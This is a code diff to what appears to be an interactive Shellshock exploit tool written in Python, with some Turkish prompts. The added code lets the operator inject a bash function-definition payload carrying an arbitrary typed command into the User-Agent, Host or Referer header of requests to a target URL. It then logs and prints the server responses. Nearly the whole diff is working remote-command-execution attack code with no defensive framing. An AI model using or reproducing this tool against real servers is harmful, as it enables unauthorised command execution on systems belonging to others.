@@ -124,18 +124,65 @@ def commandIn():
                 elif (command == "1"):
                     commandIn()
                 else:
+                    x="""
+                    
+1) -----> SEND USER-AGENT PAYLOAD
+2) -----> SEND HOST PAYLOAD
+3) -----> SEND REFERER PAYLOAD
+                    
+                    """
+                    print(Colors.b,x)
+                    secim =input("seciminiz:")
                     headers = {"User-Agent": "() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
-                    req = requests.get(aaa, headers=headers)
-                    
-                    with open("response.txt","a",encoding="utf-8") as f:
-                        f.writelines("\n\n========================================================\nBEGIN | URL:{}\n\n".format(aaa))
-                        f.writelines(req.text)
-                        f.writelines("\nEND | URL: {}\n========================================================\n".format(aaa))
-                    
-                    print("Yazdırıldı")
-                    with open("response.txt","r", encoding="utf-8") as f:
-                        for i in f:
-                            print(i.replace("\n",""))
+                    host = {"Host":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
+                    referer = {"Referer":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
+                    if(secim=="1"):
+                        req = requests.get(aaa, headers=headers)
+                        with open("response.txt", "a", encoding="utf-8") as f:
+                            f.writelines(
+                                "\n\n========================================================\nBEGIN | URL:{}\n\n".format(
+                                    aaa))
+                            f.writelines(req.text)
+                            f.writelines(
+                                "\nEND | URL: {}\n========================================================\n".format(
+                                    aaa))
+
+                        print("Yazdırıldı")
+                        with open("response.txt", "r", encoding="utf-8") as f:
+                            for i in f:
+                                print(i.replace("\n", ""))
+                    elif(secim=="2"):
+                        req = requests.get(aaa, headers=host)
+                        with open("response.txt", "a", encoding="utf-8") as f:
+                            f.writelines(
+                                "\n\n========================================================\nBEGIN | URL:{}\n\n".format(
+                                    aaa))
+                            f.writelines(req.text)
+                            f.writelines(
+                                "\nEND | URL: {}\n========================================================\n".format(
+                                    aaa))
+
+                        print("Yazdırıldı")
+                        with open("response.txt", "r", encoding="utf-8") as f:
+                            for i in f:
+                                print(i.replace("\n", ""))
+                    elif(secim=="3"):
+                        req = requests.get(aaa, headers=referer)
+                        with open("response.txt", "a", encoding="utf-8") as f:
+                            f.writelines(
+                                "\n\n========================================================\nBEGIN | URL:{}\n\n".format(
+                                    aaa))
+                            f.writelines(req.text)
+                            f.writelines(
+                                "\nEND | URL: {}\n========================================================\n".format(
+                                    aaa))
+
+                        print("Yazdırıldı")
+                        with open("response.txt", "r", encoding="utf-8") as f:
+                            for i in f:
+                                print(i.replace("\n", ""))
+                    else:
+                        print("WRONG CHOOSE!!!")
 
     except Exception as err:
        print(err)
